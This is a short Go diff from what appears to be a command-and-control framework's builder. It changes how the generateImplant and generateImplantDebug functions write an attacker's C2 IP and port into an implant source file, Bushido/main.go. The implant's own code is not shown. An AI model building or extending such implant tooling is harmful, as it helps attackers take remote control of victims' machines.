@@ -9,7 +9,7 @@ import (
 
 func generateImplant(c2Ip string, c2Port string) {
 	fmt.Println("Generating implant for " + c2Ip + ":" + c2Port)
-	unifiedAddress := c2Ip + ":" + c2Port
+	unifiedAddress := "c2Address := \"" + c2Ip + ":" + c2Port + "\""
 	fmt.Println("TCP Address: " + unifiedAddress)
 	content, err := os.ReadFile("Bushido/main.go")
 	if err != nil {
@@ -17,7 +17,7 @@ func generateImplant(c2Ip string, c2Port string) {
 		return
 	}
 	strContent := string(content)
-	addressRegex := regexp.MustCompile(`(?:\d{1,3}\.){3}\d{1,3}:\d+`)
+	addressRegex := regexp.MustCompile(`c2Address := "(?:\d{1,3}\.){3}\d{1,3}:\d+"`)
 	newContent := addressRegex.ReplaceAllString(strContent, unifiedAddress)
 	err = os.WriteFile("Bushido/main.go", []byte(newContent), 0777)
 	if err != nil {
@@ -33,7 +33,7 @@ func generateImplant(c2Ip string, c2Port string) {
 
 func generateImplantDebug(c2Ip string, c2Port string) {
 	fmt.Println("Generating implant for " + c2Ip + ":" + c2Port)
-	unifiedAddress := c2Ip + ":" + c2Port
+	unifiedAddress := "c2Address := \"" + c2Ip + ":" + c2Port + "\""
 	fmt.Println("TCP Address: " + unifiedAddress)
 	content, err := os.ReadFile("Bushido/main.go")
 	if err != nil {
@@ -41,7 +41,7 @@ func generateImplantDebug(c2Ip string, c2Port string) {
 		return
 	}
 	strContent := string(content)
-	addressRegex := regexp.MustCompile(`(?:\d{1,3}\.){3}\d{1,3}:\d+`)
+	addressRegex := regexp.MustCompile(`c2Address := "(?:\d{1,3}\.){3}\d{1,3}:\d+"`)
 	newContent := addressRegex.ReplaceAllString(strContent, unifiedAddress)
 	err = os.WriteFile("Bushido/main.go", []byte(newContent), 0777)
 	if err != nil {
